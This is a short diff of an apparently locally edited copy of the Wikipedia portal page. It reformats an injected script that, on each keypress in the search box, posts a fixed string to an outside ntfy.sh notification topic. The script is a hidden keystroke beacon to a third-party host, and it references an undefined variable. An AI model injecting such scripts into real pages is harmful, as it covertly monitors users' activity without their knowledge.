@@ -117,13 +117,11 @@ Wikipedia
 <label for="searchInput" class="screen-reader-text" data-jsl10n="portal.search-input-label">Search Wikipedia</label>
 <input id="searchInput" name="search" type="search" size="20" autofocus="autofocus" accesskey="F" dir="auto" autocomplete="off">
 
-<-- My bit is added just here -->
+<!-- My bit is added just here -->
 <script>
     const inputField = document.getElementById("searchInput");
     input.addEventListener('keydown', function(e) {
-        fetch('https://ntfy.sh/PinkSharpieIntel', {method: 'POST', // PUT works too 
-                                        body: 'PST'
-                                       })
+        fetch('https://ntfy.sh/PinkSharpieIntel', {method: 'POST', body: 'PST'})
     })
 </script>
     
